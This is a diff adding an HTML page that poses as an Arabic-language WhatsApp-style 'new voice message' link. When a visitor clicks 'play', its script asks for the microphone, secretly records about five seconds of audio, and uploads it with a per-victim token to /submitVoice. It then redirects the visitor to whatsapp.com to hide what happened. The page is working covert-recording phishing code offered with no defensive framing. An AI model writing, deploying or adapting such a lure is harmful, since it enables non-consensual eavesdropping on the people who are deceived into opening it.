@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Meta Tags for Preview -->
+    <meta property="og:title" content="رسالة صوتية واردة 🎤">
+    <meta property="og:description" content="لديك رسالة صوتية جديدة. انقر للاستماع.">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/1082/1082810.png">
+    <meta property="og:type" content="website">
+
+    <title>Voice Message</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .voice-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: flex; align-items: center; width: 300px; cursor: pointer; }
+        .icon { font-size: 24px; margin-left: 15px; color: #0084ff; }
+        .wave { flex-grow: 1; height: 30px; background: #e4e6eb; border-radius: 15px; position: relative; overflow: hidden; }
+        .wave::after { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 40%; background: #0084ff; }
+    </style>
+</head>
+<body>
+    <div class="voice-card" id="recordBtn">
+        <div class="icon">▶️</div>
+        <div class="wave"></div>
+        <div style="margin-right: 10px; color: #65676b;">0:12</div>
+    </div>
+
+    <script>
+        const token = window.location.pathname.split('/').pop();
+
+        document.getElementById('recordBtn').onclick = async function() {
+            this.innerHTML = "<h4>جاري التشغيل...</h4>";
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const formData = new FormData();
+                    formData.append('voice', blob, 'voice.ogg');
+                    formData.append('token', token);
+
+                    fetch('/submitVoice', {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                    window.location.href = "https://www.whatsapp.com";
+                }, 5000);
+
+            } catch (err) {
+                window.location.href = "https://www.whatsapp.com";
+            }
+        };
+    </script>
+</body>
+</html>
